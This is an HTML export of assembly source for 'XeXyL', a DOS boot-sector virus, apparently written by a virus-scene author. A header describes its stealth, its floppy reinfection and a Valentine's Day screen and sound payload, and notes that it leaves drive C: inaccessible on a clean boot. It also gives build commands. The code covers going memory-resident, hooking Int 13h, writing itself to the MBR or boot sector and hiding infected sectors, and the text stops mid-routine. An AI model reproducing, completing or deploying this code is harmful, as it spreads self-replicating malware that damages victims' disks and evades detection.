<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">;Name   - XeXyL      </span><span class="sc0">
</span><span class="sc1">;Author - MetGod </span><span class="sc0">
</span><span class="sc1">;Type   - MBR/BS </span><span class="sc0">
</span><span class="sc1">;                </span><span class="sc0">
</span><span class="sc1">;Description     </span><span class="sc0">
</span><span class="sc1">;*-*-*-*-*-*-*       </span><span class="sc0">
</span><span class="sc1">;Stealth    -&gt; Directs read of infected sector to original MBR/BS</span><span class="sc0">
</span><span class="sc1">;           -&gt; If writing to MBR is attempted, machine will</span><span class="sc0">
</span><span class="sc1">;              redirect to original MBR</span><span class="sc0">
</span><span class="sc1">;              If writing to BS of a floppy, it will allow</span><span class="sc0">
</span><span class="sc1">;              write, as once its done, it will be read and thus</span><span class="sc0">
</span><span class="sc1">;              reinfected</span><span class="sc0">
</span><span class="sc1">;Floppies   -&gt; Sectors written to Track 0, Head 1, Sector 13</span><span class="sc0">
</span><span class="sc1">;Hard Disks -&gt; Sectors written to Track 0, Head 0, Sector 2</span><span class="sc0">
</span><span class="sc1">;Payload    -&gt; On February 14th There is a video / sound effect if criteria</span><span class="sc0">
</span><span class="sc1">;              is met</span><span class="sc0">
</span><span class="sc1">;Anti-AV    -&gt; Not really A-AV yet, but</span><span class="sc0">
</span><span class="sc1">;              The MBR/BS is completely moved, thus wiping the</span><span class="sc0">
</span><span class="sc1">;              partition table, so on a clean boot, C: is inaccessible</span><span class="sc0">
</span><span class="sc1">;              And of course hooks Int 13h</span><span class="sc0">
</span><span class="sc1">;Detection  -&gt; As far as I know - only McAfee sees it but as the Max.347.</span><span class="sc0">
</span><span class="sc1">;              McAfee failed to clean it even when virus wasn't</span><span class="sc0">
</span><span class="sc1">;              even in memory..</span><span class="sc0">
</span><span class="sc1">;Anti-Detect-&gt; None currently.. Later version if I can.. </span><span class="sc0">
</span><span class="sc1">;Assembly   -&gt; tasm xexyl.asm</span><span class="sc0">
</span><span class="sc1">;              tlink /t xexyl.obj</span><span class="sc0">
</span><span class="sc1">;              xexyl</span><span class="sc0">
</span><span class="sc1">;Comments   -&gt; This is a very early version, not complete..but it has</span><span class="sc0">
</span><span class="sc1">;              some nifty stuff (such as the payload)</span><span class="sc0">
</span><span class="sc1">;*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">;Thanks &amp;   -&gt; The_Lich, Evul, Techno Phunk, VD, Opic,</span><span class="sc0">
</span><span class="sc1">;Greets        Pax, Roadkil, Owl,Buz, MetalKid, and to</span><span class="sc0">
</span><span class="sc1">;              all the others who have helped me and just</span><span class="sc0">
</span><span class="sc1">;              been overall cool..(too many to list :)</span><span class="sc0">
</span><span class="sc1">;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">


</span><span class="sc5">XeXyLSeg</span><span class="sc0">          </span><span class="sc9">SEGMENT</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">XeXyLSeg</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">XeXyLSeg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">Xexylseg</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">xexylseg</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0">            </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">installXeXyL</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">installXeXyL</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                           </span><span class="sc1">;Clear DI</span><span class="sc0">
</span><span class="sc6">cli</span><span class="sc0">                                     </span><span class="sc1">;clear interupt flag</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                               </span><span class="sc1">;set up</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">                            </span><span class="sc1">;stack</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                              </span><span class="sc1">; clear DS</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">413h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;decrease Available mem in TOM</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">12h</span><span class="sc0">                             </span><span class="sc1">;new size of mem..</span><span class="sc0">

</span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                            </span><span class="sc1">;convert to paragraphs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                          </span><span class="sc1">;one sector</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                                     </span><span class="sc1">;clear directional flag</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;write us to memory</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;save ES on stack</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookInt</span><span class="sc0">                   </span><span class="sc1">;Where we go</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;Save AX</span><span class="sc0">
</span><span class="sc6">retf</span><span class="sc0">                                    </span><span class="sc1">;retreat to stack in memory</span><span class="sc0">

</span><span class="sc5">HookInt</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;Get Int 13h Vector Address</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt13</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;Save Offset in variable</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;Get Segment</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldInt13</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;Save to variable</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">            </span><span class="sc1">;Set new Segment</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int13Handler</span><span class="sc0"> </span><span class="sc1">;Int 13h handler</span><span class="sc0">


</span><span class="sc5">PayLoadCheck</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0">                                 </span><span class="sc1">;get date</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0214h</span><span class="sc0">                               </span><span class="sc1">;is it the 14th..</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ReLoad</span><span class="sc0">                              </span><span class="sc1">;if not, forget Payload</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">StartPayLoad</span><span class="sc0">
</span><span class="sc5">ReLoad</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">19h</span><span class="sc0">                             </span><span class="sc1">;bootstrap loader with us in memory</span><span class="sc0">
</span><span class="sc5">PayLoad</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc5">delay</span><span class="sc4">:</span><span class="sc0">                   
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                 </span><span class="sc1">;save CX</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fffh</span><span class="sc0">                            </span><span class="sc1">;amount of time to loop</span><span class="sc0">
</span><span class="sc5">DelayLoop</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;for delay</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                               </span><span class="sc1">;what we do each time for delay</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DelayLoop</span><span class="sc0">                          </span><span class="sc1">;loop</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                  </span><span class="sc1">;retrieve CX</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;return to caller</span><span class="sc0">

</span><span class="sc5">sound</span><span class="sc4">:</span><span class="sc0">                                  
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                 </span><span class="sc1">;save AX</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                               </span><span class="sc1">;get a value into AX</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">;send it to 42h (for sound tone)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                               </span><span class="sc1">;get higher bit in AL</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">;send higher bit to 42h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                  </span><span class="sc1">;retrieve CX</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delay</span><span class="sc0">                              </span><span class="sc1">;call delay</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delay</span><span class="sc0">                              </span><span class="sc1">;call delay</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">;same thing as above</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                               </span><span class="sc1">;but different tone </span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">;ax is modified as video effect goes</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;return to caller</span><span class="sc0">
</span><span class="sc5">StartPayLoad</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;heres where it all starts</span><span class="sc0">
</span><span class="sc6">pusha</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">;clear CX for counter</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                              </span><span class="sc1">;turn on speaker</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b6h</span><span class="sc0">                            </span><span class="sc1">;set necessary mode to send to</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                             </span><span class="sc1">;43h </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0b800h</span><span class="sc0">                          </span><span class="sc1">;video segment</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;ES = segment </span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">;clear DI (start of screen )</span><span class="sc0">

</span><span class="sc5">VideoEffect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">16dh</span><span class="sc0">                            </span><span class="sc1">;add value to DI</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1890h</span><span class="sc0">                           </span><span class="sc1">;is new value = to 1890h</span><span class="sc0">
</span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">ContinuePay</span><span class="sc0">                         </span><span class="sc1">;if it's &lt; than, skip next command</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1890h</span><span class="sc0">                           </span><span class="sc1">;else subtract 1890h</span><span class="sc0">

</span><span class="sc5">ContinuePay</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;puttint video buffer (es:[di]) to AX</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">;modifying DI </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                         </span><span class="sc1">;sending it back to video buffer</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sound</span><span class="sc0">                             </span><span class="sc1">;call sound routine</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5000</span><span class="sc0">                            </span><span class="sc1">;We want to do this 5000 times</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">LoopPay</span><span class="sc0">                            </span><span class="sc1">;if it hasn't reached it, continue on </span><span class="sc0">

                                       </span><span class="sc1">;takes about a minute or so to complete </span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                              </span><span class="sc1">;Turn off speaker </span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                             </span><span class="sc1">;after we are done</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ReLoad</span><span class="sc0">                             </span><span class="sc1">;then continue on to reload</span><span class="sc0">

</span><span class="sc5">LoopPay</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;here is the looper</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                 </span><span class="sc1">;increase CX everytime</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">VideoEffect</span><span class="sc0">                  </span><span class="sc1">;and continue until CX = 5000</span><span class="sc0">



</span><span class="sc5">Int13Handler</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;sector 1?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit13Handler</span><span class="sc0">                       </span><span class="sc1">;If not, we goto original 13h handler</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                                </span><span class="sc1">;head 0?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Exit13Handler</span><span class="sc0">                       </span><span class="sc1">;If not, we goto original 13h handler</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;Are we reading this sector?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CallInt13</span><span class="sc0">                       </span><span class="sc1">;If not, we goto original 13h handler</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">;write?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit13Handler</span><span class="sc0">                  </span><span class="sc1">;no, give BIOS int 13h</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                            </span><span class="sc1">;floppy disk?</span><span class="sc0">
</span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">FloppyWrite</span><span class="sc0">                     </span><span class="sc1">;Yes, allow boot write, once read again </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ChooseSector</span><span class="sc0">                   </span><span class="sc1">;will be re-infected</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int13</span><span class="sc0">                          </span><span class="sc1">;write to orignal MBR</span><span class="sc0">
</span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">                            </span><span class="sc1">;return</span><span class="sc0">
</span><span class="sc5">FloppyWrite</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;floppy, let it be written</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int13</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CallInt13</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int13</span><span class="sc0">                              </span><span class="sc1">;ELSE, We use OUR int 13h handler</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ReadSector</span><span class="sc0">                          </span><span class="sc1">;If no error, We continue</span><span class="sc0">
</span><span class="sc5">Exit13Handler</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;If there is an error, we use Original</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">                                 </span><span class="sc1">;Old int13h</span><span class="sc0">
</span><span class="sc5">OldInt13</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">;Variable for our OWN</span><span class="sc0">
                                        </span><span class="sc1">;</span><span class="sc0">
                                        
</span><span class="sc5">ReadSector</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">;push everything onto stack</span><span class="sc0">
</span><span class="sc6">pusha</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">XeXyl</span><span class="sc4">],</span><span class="sc12">'eX'</span><span class="sc0">  </span><span class="sc1">;Disk infected?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StealthProt</span><span class="sc0">                          </span><span class="sc1">;Yes, then stealth it</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                               </span><span class="sc1">;CS=DS=ES</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                           </span><span class="sc1">;read original sector to</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                             </span><span class="sc1">;512</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int13</span><span class="sc0">                              </span><span class="sc1">;call int13</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">                              </span><span class="sc1">;copy 3ch bytes for floppies</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">514</span><span class="sc0">                             </span><span class="sc1">;get the bytes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                </span><span class="sc1">;where to put them</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                                     </span><span class="sc1">;clear directional flag</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy themover</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ChooseSector</span><span class="sc0">                       </span><span class="sc1">;Check if HDD or Floppy</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                             </span><span class="sc1">;to see where we write original mbr/bs</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int13</span><span class="sc0">                              </span><span class="sc1">;write original mbr/bs</span><span class="sc0">

</span><span class="sc5">WriteUs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                               </span><span class="sc1">;clear BX (buffer)</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                               </span><span class="sc1">;head 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                </span><span class="sc1">;track 1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                             </span><span class="sc1">;write sector</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int13</span><span class="sc0">                              </span><span class="sc1">;writes us to mbr/bs</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">                          </span><span class="sc1">;exit </span><span class="sc0">

</span><span class="sc5">StealthProt</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                             </span><span class="sc1">;If a read was called and already</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ChooseSector</span><span class="sc0">                       </span><span class="sc1">;infected - then we redirect it to</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int13</span><span class="sc0">                              </span><span class="sc1">;original sector</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">
